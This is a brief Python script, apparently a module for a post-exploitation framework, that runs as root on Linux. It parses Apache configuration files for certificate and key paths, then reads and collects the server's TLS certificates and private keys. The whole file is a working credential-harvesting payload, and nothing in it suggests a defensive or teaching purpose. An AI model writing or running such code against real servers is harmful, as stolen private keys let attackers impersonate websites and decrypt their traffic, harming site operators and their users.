#REQUIRE_LINUX
#REQUIRE ROOT

import re

result = []

def parse_ssl_cert (apache_config):
    cert = re.search('(?<=SSLCertificateFile)(?! directive)    (.*)', apache_config)
    if cert:
        return cert.group(1)
    else:
        return ''

def parse_ssl_key (apache_config):
    #key = re.search('(?<=SSLCertificateKeyFile )(.*?)\'', apache_config)
    key = re.search('(?<=SSLCertificateKeyFile )(.*)', apache_config)
    if key:
        return key.group(1)
    else:
        return ''


apache_files = run_payload('apache_config_files')
for file in apache_files:
    if parse_ssl_cert(read(file)) != '':
        result.append(read(parse_ssl_cert(read(file))))
    if parse_ssl_key(read(file)) != '':
        result.append(read(parse_ssl_key(read(file))))
